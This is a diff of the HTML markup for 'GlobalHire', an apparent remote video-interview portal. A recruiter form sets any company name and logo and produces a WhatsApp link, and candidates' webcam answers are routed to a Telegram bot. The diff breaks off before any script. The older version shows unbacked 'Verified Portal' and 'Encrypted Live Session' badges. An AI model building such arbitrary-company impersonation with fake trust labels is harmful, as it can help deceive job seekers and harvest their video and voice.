@@ -1,336 +1,316 @@
 <!DOCTYPE html>
-<html lang="en" class="h-full bg-slate-950">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GlobalHire — Enterprise Remote Interview Suite</title>
+    <title>GlobalHire - Remote Assessment Portal</title>
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- FontAwesome Icons -->
+    <!-- FontAwesome for Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <!-- Google Fonts: Inter -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         body { font-family: 'Inter', sans-serif; }
-        
-        @keyframes pulse-ring {
+        .pulse-recording { animation: pulse-red 1.5s infinite; }
+        @keyframes pulse-red {
             0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.7); }
-            70% { transform: scale(1.05); box-shadow: 0 0 0 12px rgba(239, 68, 68, 0); }
+            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(239, 68, 68, 0); }
             100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(239, 68, 68, 0); }
-        }
-        .recording-pulse { animation: pulse-ring 1.8s infinite ease-in-out; }
-
-        .waveform-bar {
-            animation: wave 1.2s infinite ease-in-out alternate;
-        }
-        .waveform-bar:nth-child(2) { animation-delay: 0.2s; }
-        .waveform-bar:nth-child(3) { animation-delay: 0.4s; }
-        .waveform-bar:nth-child(4) { animation-delay: 0.1s; }
-        @keyframes wave {
-            0% { height: 4px; }
-            100% { height: 18px; }
         }
     </style>
 </head>
-<body class="bg-slate-950 text-slate-100 min-h-full flex flex-col justify-between selection:bg-indigo-500 selection:text-white">
+<body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col justify-between selection:bg-indigo-500 selection:text-white">
 
-    <!-- Notification Toast Modal -->
-    <div id="toast" class="fixed top-5 right-5 z-50 transform translate-x-full transition-all duration-300 bg-slate-900 border border-slate-700/80 text-white px-5 py-4 rounded-2xl shadow-2xl flex items-center space-x-3 max-w-md">
-        <div id="toast-icon" class="text-xl shrink-0"></div>
-        <div class="flex-grow">
-            <h4 id="toast-title" class="font-semibold text-sm leading-tight"></h4>
+    <!-- Toast Notification System -->
+    <div id="toast" class="fixed top-5 right-5 z-50 transform translate-x-full transition-transform duration-300 bg-slate-800 border border-slate-700 text-white px-5 py-3.5 rounded-xl shadow-2xl flex items-center space-x-3">
+        <div id="toast-icon" class="text-lg"></div>
+        <div>
+            <h4 id="toast-title" class="font-semibold text-xs uppercase tracking-wider"></h4>
             <p id="toast-message" class="text-xs text-slate-400 mt-0.5"></p>
         </div>
     </div>
 
     <!-- Header Navigation -->
-    <header class="bg-slate-900/80 backdrop-blur-md border-b border-slate-800/80 sticky top-0 z-40">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
+    <header class="bg-slate-900/80 backdrop-blur border-b border-slate-800/80 sticky top-0 z-40">
+        <div class="max-w-6xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between">
             <div class="flex items-center space-x-3">
-                <div class="bg-gradient-to-tr from-indigo-600 to-indigo-400 p-2.5 rounded-xl text-white shadow-lg shadow-indigo-500/25">
-                    <i class="fa-solid fa-briefcase text-lg"></i>
+                <div class="bg-indigo-600 p-2 rounded-xl text-white shadow-lg shadow-indigo-600/30">
+                    <i class="fa-solid fa-layer-group text-lg"></i>
                 </div>
                 <div>
-                    <span class="text-lg font-bold tracking-tight text-white">Global<span class="text-indigo-400">Hire</span></span>
-                    <span class="text-[10px] block text-slate-400 font-medium uppercase tracking-wider">Automated Interview Portal</span>
+                    <span class="text-base font-bold tracking-tight bg-gradient-to-r from-white to-slate-400 bg-clip-text text-transparent">GlobalHire</span>
+                    <span class="text-[10px] block text-indigo-400 font-medium tracking-wide">Automated Recruitment Engine</span>
                 </div>
             </div>
-            <div id="header-status" class="text-xs bg-slate-800/80 px-3.5 py-1.5 rounded-full text-slate-300 border border-slate-700/60 flex items-center space-x-2">
-                <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
-                <span class="font-medium">Encrypted Live Session</span>
+            <div id="header-status" class="text-xs bg-slate-800/80 px-3 py-1 rounded-full text-slate-300 border border-slate-700/60 flex items-center space-x-2">
+                <span class="w-2 h-2 rounded-full bg-emerald-400"></span>
+                <span>Active Candidate Gateway</span>
             </div>
         </div>
     </header>
 
-    <!-- MAIN CONTAINER -->
-    <main class="flex-grow max-w-5xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-8">
+    <!-- MAIN APP CONTAINER -->
+    <main class="flex-grow max-w-4xl w-full mx-auto px-4 sm:px-6 py-8">
 
-        <!-- VIEW 0: EXPIRED / ALREADY USED LINK SCREEN -->
+        <!-- ==================== VIEW 0: LINK EXPIRED ==================== -->
         <div id="view-expired" class="hidden space-y-6 text-center py-20 max-w-md mx-auto">
-            <div class="w-20 h-20 bg-rose-500/10 border border-rose-500/20 rounded-3xl mx-auto flex items-center justify-center text-rose-500 text-3xl shadow-2xl shadow-rose-500/10">
+            <div class="w-16 h-16 bg-rose-500/10 border border-rose-500/30 rounded-2xl mx-auto flex items-center justify-center text-rose-500 text-2xl shadow-xl shadow-rose-500/10">
                 <i class="fa-solid fa-lock"></i>
             </div>
             <div class="space-y-2">
-                <h2 class="text-2xl font-bold text-white tracking-tight">Interview Completed & Locked</h2>
+                <h2 class="text-2xl font-bold text-white tracking-tight">Assessment Completed</h2>
                 <p class="text-xs text-slate-400 leading-relaxed">
-                    This single-use candidate session link has already been submitted. To preserve assessment security, links cannot be re-opened once responses are transmitted.
+                    This interview link has already been used and submitted. To protect assessment security, candidate links automatically lock upon submission.
                 </p>
             </div>
             <div class="pt-2">
                 <span class="inline-flex items-center space-x-2 bg-slate-900 border border-slate-800 px-4 py-2 rounded-xl text-xs text-slate-400">
                     <i class="fa-solid fa-shield-halved text-rose-400"></i>
-                    <span>Status: Assessment Finalized</span>
+                    <span>Status: Locked & Transmitted</span>
                 </span>
             </div>
         </div>
 
-        <!-- VIEW 1: RECRUITER SETUP DASHBOARD -->
-        <div id="view-recruiter" class="space-y-8">
-            <div class="bg-gradient-to-r from-indigo-950/60 via-slate-900 to-slate-900 border border-indigo-500/20 rounded-2xl p-6 sm:p-8 shadow-2xl">
-                <div class="inline-flex items-center space-x-2 px-3 py-1 bg-indigo-500/10 border border-indigo-500/20 rounded-full text-xs font-semibold text-indigo-400 mb-4">
-                    <i class="fa-solid fa-sliders"></i>
-                    <span>Recruiter Control Hub</span>
-                </div>
-                <h1 class="text-2xl sm:text-3xl font-bold text-white tracking-tight">Configure Candidate Assessment</h1>
-                <p class="text-slate-400 mt-2 text-xs sm:text-sm max-w-2xl leading-relaxed">
-                    Set up candidate and company parameters below. When sent, candidate video responses will be securely uploaded and delivered to your designated Telegram Channel/Bot.
+        <!-- ==================== VIEW 1: RECRUITER GENERATOR ==================== -->
+        <div id="view-recruiter" class="space-y-6">
+            <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6 sm:p-8 shadow-xl relative overflow-hidden">
+                <div class="absolute -right-10 -bottom-10 w-40 h-40 bg-indigo-600/10 rounded-full blur-2xl"></div>
+                <h1 class="text-2xl font-bold text-white tracking-tight">Create Interview Link</h1>
+                <p class="text-slate-400 text-xs mt-1 max-w-xl">
+                    Fill in the details below. All setup data (including your company logo) is compressed inside the clean WhatsApp-ready URL.
                 </p>
             </div>
 
             <form id="setup-form" class="bg-slate-900 border border-slate-800 rounded-2xl p-6 sm:p-8 shadow-xl space-y-6">
-                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                    <div>
-                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Company Name</label>
-                        <input type="text" id="company-name" required placeholder="e.g. Apex Global Tech" 
-                            class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-sm text-white placeholder-slate-600 focus:outline-none focus:border-indigo-500 transition">
+                
+                <!-- Logo Preview Box -->
+                <div class="flex items-center space-x-4 p-4 bg-slate-950/60 border border-slate-800 rounded-xl">
+                    <div id="logo-preview-box" class="w-16 h-16 rounded-xl bg-slate-800 border border-slate-700 flex items-center justify-center text-slate-500 text-xs text-center shrink-0 overflow-hidden">
+                        <span>No Logo</span>
                     </div>
-
-                    <div>
-                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Company Location / HQ</label>
-                        <input type="text" id="company-address" required placeholder="e.g. London, UK (Remote)" 
-                            class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-sm text-white placeholder-slate-600 focus:outline-none focus:border-indigo-500 transition">
-                    </div>
-
-                    <div>
-                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Recruiter / Interviewer Name</label>
-                        <input type="text" id="rep-name" required placeholder="e.g. Sarah Jenkins" 
-                            class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-sm text-white placeholder-slate-600 focus:outline-none focus:border-indigo-500 transition">
-                    </div>
-
-                    <div>
-                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Candidate Full Name</label>
-                        <input type="text" id="candidate-name" required placeholder="e.g. Alejandro Morales" 
-                            class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-sm text-white placeholder-slate-600 focus:outline-none focus:border-indigo-500 transition">
-                    </div>
-
-                    <div class="md:col-span-2">
-                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Target Job Position</label>
-                        <input type="text" id="job-position" required placeholder="e.g. Senior Full-Stack Engineer" 
-                            class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-sm text-white placeholder-slate-600 focus:outline-none focus:border-indigo-500 transition">
-                    </div>
-
-                    <div>
-                        <div class="flex items-center justify-between mb-2">
-                            <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400">Telegram Bot Token</label>
-                            <span class="text-[10px] text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/20 font-mono">Embedded</span>
-                        </div>
-                        <input type="text" id="telegram-token" placeholder="Leave empty for default" 
-                            class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-sm text-white placeholder-slate-600 focus:outline-none focus:border-indigo-500 transition font-mono text-xs">
-                    </div>
-
-                    <div>
-                        <div class="flex items-center justify-between mb-2">
-                            <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400">Telegram Chat ID</label>
-                            <span class="text-[10px] text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/20 font-mono">Embedded</span>
-                        </div>
-                        <input type="text" id="telegram-chatid" placeholder="Leave empty for default" 
-                            class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-sm text-white placeholder-slate-600 focus:outline-none focus:border-indigo-500 transition font-mono text-xs">
+                    <div class="flex-grow">
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1">Company Logo Photo</label>
+                        <input type="file" id="company-logo" accept="image/*" 
+                            class="w-full text-xs text-slate-400 file:mr-3 file:py-1.5 file:px-3 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-indigo-600 file:text-white hover:file:bg-indigo-500 transition cursor-pointer">
+                        <p class="text-[10px] text-slate-500 mt-1">Recommended square format (PNG/JPG). Compressed automatically.</p>
                     </div>
                 </div>
 
-                <div class="pt-4 flex flex-col sm:flex-row gap-4 items-center justify-end border-t border-slate-800">
-                    <button type="button" id="btn-test-telegram" class="w-full sm:w-auto px-5 py-3 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 font-medium text-xs transition flex items-center justify-center space-x-2 border border-slate-700">
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Company Name</label>
+                        <input type="text" id="company-name" required placeholder="e.g. Apex Global Systems" 
+                            class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-indigo-500 transition">
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Location / Address</label>
+                        <input type="text" id="company-address" required placeholder="e.g. London, UK" 
+                            class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-indigo-500 transition">
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Recruiter / Contact Name</label>
+                        <input type="text" id="rep-name" required placeholder="e.g. Sarah Jenkins" 
+                            class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-indigo-500 transition">
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Candidate Full Name</label>
+                        <input type="text" id="candidate-name" required placeholder="e.g. Alejandro Morales" 
+                            class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-indigo-500 transition">
+                    </div>
+
+                    <div class="md:col-span-2">
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Job Position</label>
+                        <input type="text" id="job-position" required placeholder="e.g. Senior Full-Stack Engineer" 
+                            class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-indigo-500 transition">
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Telegram Bot Token</label>
+                        <input type="text" id="telegram-token" placeholder="Optional token override" 
+                            class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-xs text-white focus:outline-none focus:border-indigo-500 transition">
+                    </div>
+
+                    <div>
+                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-400 mb-1.5">Telegram Chat ID</label>
+                        <input type="text" id="telegram-chatid" placeholder="Optional Chat ID override" 
+                            class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-2.5 text-xs text-white focus:outline-none focus:border-indigo-500 transition">
+                    </div>
+                </div>
+
+                <div class="pt-4 flex flex-col sm:flex-row gap-3 justify-end border-t border-slate-800">
+                    <button type="button" id="btn-test-telegram" class="px-5 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-white font-medium text-xs transition flex items-center justify-center space-x-2">
                         <i class="fa-brands fa-telegram text-indigo-400"></i>
-                        <span>Verify Telegram Bot</span>
+                        <span>Test Telegram</span>
                     </button>
-                    <button type="submit" class="w-full sm:w-auto px-7 py-3 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white font-semibold text-xs shadow-lg shadow-indigo-600/30 transition flex items-center justify-center space-x-2">
-                        <i class="fa-solid fa-link"></i>
-                        <span>Generate Single-Use Link</span>
+                    <button type="submit" class="px-7 py-2.5 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white font-semibold text-xs shadow-lg shadow-indigo-600/30 transition flex items-center justify-center space-x-2">
+                        <i class="fa-solid fa-paper-plane"></i>
+                        <span>Generate WhatsApp Link</span>
                     </button>
                 </div>
             </form>
 
-            <!-- Generated Link Output Card -->
-            <div id="link-output-card" class="hidden bg-slate-900 border border-emerald-500/30 rounded-2xl p-6 sm:p-8 shadow-2xl space-y-4">
-                <div class="flex items-center space-x-3 text-emerald-400">
-                    <i class="fa-solid fa-circle-check text-xl"></i>
-                    <h3 class="text-base font-bold text-white">Interview Session Generated!</h3>
+            <!-- Output Box -->
+            <div id="link-output-card" class="hidden bg-slate-900 border border-emerald-500/40 rounded-2xl p-6 shadow-xl space-y-3">
+                <div class="flex items-center space-x-2 text-emerald-400 text-sm font-bold">
+                    <i class="fa-solid fa-circle-check"></i>
+                    <span>WhatsApp Candidate Link Ready!</span>
                 </div>
-                <p class="text-xs text-slate-300 leading-relaxed">
-                    Copy and share this unique session link with candidate. All parameters are securely encoded into the URL.
-                </p>
-                <div class="flex flex-col sm:flex-row items-center gap-3">
-                    <input type="text" id="generated-url" readonly class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-indigo-300 text-xs select-all font-mono">
-                    <button id="btn-copy-link" class="w-full sm:w-auto bg-emerald-600 hover:bg-emerald-500 text-white px-6 py-3 rounded-xl text-xs font-semibold transition flex items-center justify-center space-x-2 shrink-0">
+                <div class="flex items-center space-x-2">
+                    <input type="text" id="generated-url" readonly class="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-xs text-slate-300 font-mono select-all">
+                    <button id="btn-copy-link" class="bg-emerald-600 hover:bg-emerald-500 text-white px-4 py-2.5 rounded-xl text-xs font-semibold whitespace-nowrap transition flex items-center space-x-1.5">
                         <i class="fa-regular fa-copy"></i>
                         <span>Copy Link</span>
                     </button>
                 </div>
-                <div class="flex justify-end pt-2">
-                    <button id="btn-preview-interview" class="text-indigo-400 hover:text-indigo-300 text-xs font-medium flex items-center space-x-1.5 transition">
-                        <span>Launch Candidate Preview</span>
+                <div class="flex justify-end">
+                    <button id="btn-preview-interview" class="text-xs text-indigo-400 hover:text-indigo-300 font-medium flex items-center space-x-1">
+                        <span>Launch Candidate Session</span>
                         <i class="fa-solid fa-arrow-right"></i>
                     </button>
                 </div>
             </div>
         </div>
 
-        <!-- VIEW 2: CANDIDATE INTERVIEW INTERFACE -->
+        <!-- ==================== VIEW 2: CANDIDATE STEP-BY-STEP INTERVIEW ==================== -->
         <div id="view-candidate" class="hidden space-y-6">
-            <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl flex flex-col md:flex-row items-center justify-between gap-6">
+
+            <!-- Company Header Bar (Dynamic Logo Display) -->
+            <div class="bg-slate-900 border border-slate-800 rounded-2xl p-5 shadow-xl flex items-center justify-between gap-4">
                 <div class="flex items-center space-x-4">
-                    <div class="w-14 h-14 rounded-xl bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center text-indigo-400 shrink-0">
-                        <i class="fa-solid fa-building text-2xl"></i>
+                    <div id="display-company-logo-wrap" class="w-14 h-14 rounded-xl bg-slate-800 border border-slate-700 flex items-center justify-center text-slate-400 shrink-0 overflow-hidden shadow-inner">
+                        <i class="fa-solid fa-building text-xl"></i>
                     </div>
                     <div>
-                        <div class="flex items-center space-x-2">
-                            <h2 id="display-company-name" class="text-lg font-bold text-white">Company Name</h2>
-                            <span class="text-[10px] bg-emerald-500/10 text-emerald-400 px-2 py-0.5 rounded border border-emerald-500/20 font-medium">Verified Portal</span>
-                        </div>
-                        <p id="display-company-address" class="text-xs text-slate-400 mt-0.5"><i class="fa-solid fa-location-dot mr-1 text-slate-500"></i> Address</p>
+                        <h2 id="display-company-name" class="text-lg font-bold text-white tracking-tight">Company Name</h2>
+                        <p id="display-company-address" class="text-xs text-slate-400 mt-0.5"><i class="fa-solid fa-location-dot text-indigo-400 mr-1"></i> Address</p>
                     </div>
                 </div>
-                <div class="bg-slate-950 border border-slate-800 rounded-xl p-3.5 text-left w-full md:w-auto min-w-[260px] space-y-1">
-                    <div class="text-xs text-slate-400">Candidate: <strong id="display-candidate-name" class="text-white font-medium">Name</strong></div>
-                    <div class="text-xs text-slate-400">Position: <strong id="display-job-position" class="text-indigo-400 font-medium">Position</strong></div>
-                    <div class="text-xs text-slate-400">Interviewer: <strong id="display-rep-name" class="text-white font-medium">Rep</strong></div>
+                <div class="hidden sm:block text-right bg-slate-950/80 border border-slate-800 rounded-xl px-4 py-2">
+                    <div class="text-[11px] text-slate-400">Position: <strong id="display-job-position" class="text-indigo-400 font-medium">Position</strong></div>
+                    <div class="text-[11px] text-slate-400">Candidate: <strong id="display-candidate-name" class="text-white font-medium">Name</strong></div>
                 </div>
             </div>
 
-            <!-- Interview Stage Box -->
-            <div id="interview-stage-container" class="bg-slate-900 border border-slate-800 rounded-2xl overflow-hidden shadow-2xl">
-                <!-- Top Progress Bar -->
-                <div class="bg-slate-950 px-6 py-3 border-b border-slate-800 flex items-center justify-between">
+            <!-- Main Interactive Card -->
+            <div class="bg-slate-900 border border-slate-800 rounded-2xl overflow-hidden shadow-2xl">
+                <!-- Progress Header -->
+                <div class="bg-slate-950 px-6 py-3.5 border-b border-slate-800 flex items-center justify-between">
                     <span id="question-counter" class="text-xs font-semibold uppercase tracking-wider text-indigo-400">Question 1 of 4</span>
                     <div class="w-36 bg-slate-800 rounded-full h-2 overflow-hidden">
-                        <div id="progress-bar" class="bg-indigo-500 h-2 rounded-full transition-all duration-300" style="width: 25%;"></div>
+                        <div id="progress-bar" class="bg-indigo-600 h-2 rounded-full transition-all duration-300" style="width: 25%;"></div>
                     </div>
                 </div>
 
                 <div class="p-6 sm:p-8 space-y-6">
-                    <!-- Question Display Card -->
-                    <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-5 flex items-center justify-between gap-4">
-                        <div class="space-y-1 flex-grow">
-                            <span class="text-[10px] text-slate-500 uppercase tracking-widest font-semibold block">Interview Question</span>
-                            <h3 id="question-text" class="text-base sm:text-lg font-semibold text-white leading-snug">Loading question...</h3>
-                        </div>
-                        
-                        <div class="flex items-center space-x-3 shrink-0">
-                            <!-- Visual Waveform Animation when Audio Plays -->
-                            <div id="audio-waveform" class="hidden items-center space-x-1 h-5 px-2 bg-indigo-500/10 rounded-lg border border-indigo-500/20">
-                                <span class="waveform-bar w-1 bg-indigo-400 rounded-full"></span>
-                                <span class="waveform-bar w-1 bg-indigo-400 rounded-full"></span>
-                                <span class="waveform-bar w-1 bg-indigo-400 rounded-full"></span>
-                                <span class="waveform-bar w-1 bg-indigo-400 rounded-full"></span>
-                            </div>
 
-                            <button id="btn-repeat-audio" title="Listen to Question" class="bg-slate-800 hover:bg-slate-700 text-indigo-400 w-10 h-10 rounded-xl flex items-center justify-center border border-slate-700 transition shadow">
-                                <i class="fa-solid fa-volume-high text-base"></i>
-                            </button>
+                    <!-- Question & TTS Box -->
+                    <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-5 flex items-start justify-between gap-4">
+                        <div>
+                            <span class="text-[10px] text-slate-500 uppercase tracking-widest font-bold">Interview Question</span>
+                            <h3 id="question-text" class="text-base sm:text-lg font-semibold text-white leading-relaxed mt-1">Loading prompt...</h3>
                         </div>
+                        <button id="btn-repeat-audio" title="Listen to Question" class="bg-slate-800 hover:bg-slate-700 text-indigo-400 w-10 h-10 rounded-xl flex items-center justify-center border border-slate-700 shrink-0 transition shadow">
+                            <i class="fa-solid fa-volume-high"></i>
+                        </button>
                     </div>
 
-                    <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
-                        <!-- Camera Viewfinder -->
-                        <div class="lg:col-span-2 bg-slate-950 rounded-xl overflow-hidden border border-slate-800 relative aspect-video flex items-center justify-center shadow-inner">
+                    <!-- Camera & Recording Area -->
+                    <div class="space-y-4">
+                        <div class="bg-slate-950 rounded-xl overflow-hidden border border-slate-800 relative aspect-video max-h-[380px] mx-auto flex items-center justify-center">
                             <video id="camera-preview" autoplay muted playsinline class="w-full h-full object-cover"></video>
                             
-                            <!-- Recording Badge Overlay -->
-                            <div id="recording-badge" class="hidden absolute top-4 left-4 bg-red-500/90 text-white px-3 py-1.5 rounded-lg text-xs font-semibold flex items-center space-x-2 backdrop-blur-md shadow-lg">
-                                <span class="w-2.5 h-2.5 rounded-full bg-white recording-pulse"></span>
+                            <!-- Timer Badge -->
+                            <div id="recording-badge" class="hidden absolute top-4 left-4 bg-red-600/90 text-white px-3 py-1 rounded-lg text-xs font-semibold flex items-center space-x-2 shadow-lg backdrop-blur">
+                                <span class="w-2 h-2 rounded-full bg-white pulse-recording"></span>
                                 <span id="recording-timer">00:00</span>
                             </div>
 
                             <!-- Camera Activation Overlay -->
-                            <div id="camera-placeholder" class="absolute inset-0 bg-slate-950 flex flex-col items-center justify-center p-6 text-center">
-                                <div class="w-14 h-14 rounded-2xl bg-indigo-500/10 flex items-center justify-center text-indigo-400 mb-3 border border-indigo-500/20">
+                            <div id="camera-placeholder" class="absolute inset-0 bg-slate-950 flex flex-col items-center justify-center p-6 text-center z-10">
+                                <div class="w-14 h-14 rounded-full bg-slate-900 border border-slate-800 flex items-center justify-center text-indigo-400 mb-3">
                                     <i class="fa-solid fa-video text-xl"></i>
                                 </div>
-                                <h4 class="font-semibold text-white text-sm">Camera & Microphone Access</h4>
-                                <p class="text-xs text-slate-400 max-w-sm mt-1">Please grant camera and microphone permissions to initialize the recording viewfinder.</p>
-                                <button id="btn-init-camera" class="mt-4 px-5 py-2.5 bg-indigo-600 hover:bg-indigo-500 text-white rounded-xl text-xs font-semibold shadow-lg shadow-indigo-600/30 transition">
-                                    Enable Hardware Access
+                                <h4 class="text-sm font-semibold text-white">Camera & Microphone Access</h4>
+                                <p class="text-xs text-slate-400 max-w-sm mt-1">Click below to allow device access and start your video response.</p>
+                                <button id="btn-init-camera" class="mt-4 px-6 py-2.5 bg-indigo-600 hover:bg-indigo-500 text-white rounded-xl text-xs font-semibold shadow-lg transition">
+                                    Enable Camera
                                 </button>
                             </div>
                         </div>
 
-                        <!-- Response Controls Sidebar -->
-                        <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-5 flex flex-col justify-between space-y-4">
-                            <div>
-                                <h4 class="text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2">Response Panel</h4>
-                                <p class="text-xs text-slate-400 mb-4 leading-relaxed">Speak clearly into your microphone. Stop recording when completed to preview or continue.</p>
-                                
-                                <div id="recording-status-text" class="text-xs font-medium text-slate-300 bg-slate-900 p-3 rounded-xl border border-slate-800 flex items-start space-x-2 leading-tight">
-                                    <i class="fa-solid fa-circle-info text-indigo-400 mt-0.5 shrink-0"></i>
-                                    <span>Ready to record response.</span>
-                                </div>
+                        <!-- One-Click Primary Action Button (No Confusion) -->
+                        <div class="max-w-md mx-auto space-y-3 pt-2">
+                            <div id="action-hint" class="text-center text-xs text-slate-400">
+                                Click below to start recording your response.
                             </div>
 
-                            <div class="space-y-3">
-                                <button id="btn-start-record" disabled class="w-full py-3 bg-red-600 hover:bg-red-500 disabled:opacity-40 disabled:cursor-not-allowed text-white rounded-xl font-semibold text-xs shadow-lg shadow-red-600/20 transition flex items-center justify-center space-x-2">
-                                    <i class="fa-solid fa-circle text-[10px]"></i>
-                                    <span>Start Recording</span>
-                                </button>
+                            <button id="btn-main-action" disabled class="w-full py-3.5 bg-indigo-600 hover:bg-indigo-500 disabled:opacity-40 disabled:cursor-not-allowed text-white rounded-xl font-semibold text-xs shadow-lg shadow-indigo-600/20 transition flex items-center justify-center space-x-2">
+                                <i class="fa-solid fa-circle text-[10px]"></i>
+                                <span>Start Recording Answer</span>
+                            </button>
 
-                                <button id="btn-stop-record" class="hidden w-full py-3 bg-slate-800 hover:bg-slate-700 text-white rounded-xl font-semibold text-xs border border-slate-700 transition flex items-center justify-center space-x-2">
-                                    <i class="fa-solid fa-square text-[10px] text-red-500"></i>
-                                    <span>Stop Recording</span>
-                                </button>
-
-                                <button id="btn-next-question" disabled class="w-full py-3 bg-indigo-600 hover:bg-indigo-500 disabled:opacity-40 disabled:cursor-not-allowed text-white rounded-xl font-semibold text-xs shadow-lg shadow-indigo-600/30 transition flex items-center justify-center space-x-2">
-                                    <span>Next Question</span>
-                                    <i class="fa-solid fa-arrow-right text-[10px]"></i>
-                                </button>
-                            </div>
+                            <button id="btn-rerecord" class="hidden w-full py-2 text-xs text-slate-400 hover:text-white transition text-center">
+                                <i class="fa-solid fa-rotate-right mr-1"></i> Re-record this question
+                            </button>
                         </div>
                     </div>
+
                 </div>
             </div>
         </div>
 
-        <!-- VIEW 3: UPLOADING & COMPLETION -->
-        <div id="view-success" class="hidden space-y-6 text-center py-16 max-w-lg mx-auto">
-            <div class="w-20 h-20 bg-emerald-500/10 border border-emerald-500/20 rounded-3xl mx-auto flex items-center justify-center text-emerald-400 text-3xl shadow-2xl shadow-emerald-500/10">
-                <i class="fa-solid fa-circle-check"></i>
-            </div>
-            <div class="space-y-2">
-                <h2 class="text-2xl font-bold text-white tracking-tight">Interview Successfully Submitted!</h2>
-                <p id="success-subtitle" class="text-xs text-slate-400">Your video responses are being transmitted to the hiring team.</p>
+        <!-- ==================== VIEW 3: UPLOAD & PROGRESS BARS (CANDIDATE HIDDEN) ==================== -->
+        <div id="view-success" class="hidden space-y-6 py-8 max-w-xl mx-auto">
+            
+            <div class="text-center space-y-2">
+                <div class="w-16 h-16 bg-emerald-500/10 border border-emerald-500/30 rounded-2xl mx-auto flex items-center justify-center text-emerald-400 text-2xl shadow-xl shadow-emerald-500/10">
+                    <i class="fa-solid fa-cloud-arrow-up"></i>
+                </div>
+                <h2 class="text-2xl font-bold text-white tracking-tight">Transmitting Responses</h2>
+                <p id="upload-status-heading" class="text-xs text-slate-400">Please keep this window open while your interview videos upload securely.</p>
             </div>
 
-            <div id="upload-progress-card" class="bg-slate-900 border border-slate-800 rounded-2xl p-6 text-left space-y-4 shadow-xl">
-                <div class="flex items-center justify-between text-xs font-semibold text-slate-300">
-                    <span id="upload-status-label">Transmitting payload...</span>
-                    <span id="upload-percentage">0%</span>
+            <!-- Per-Question Progress Bars Container -->
+            <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6 shadow-xl space-y-5">
+                
+                <!-- Questions Upload Progress List -->
+                <div id="question-upload-list" class="space-y-4">
+                    <!-- Populated dynamically via JS -->
                 </div>
-                <div class="w-full bg-slate-950 rounded-full h-2 overflow-hidden border border-slate-800">
-                    <div id="upload-progress-bar" class="bg-indigo-500 h-2 rounded-full transition-all duration-300" style="width: 0%"></div>
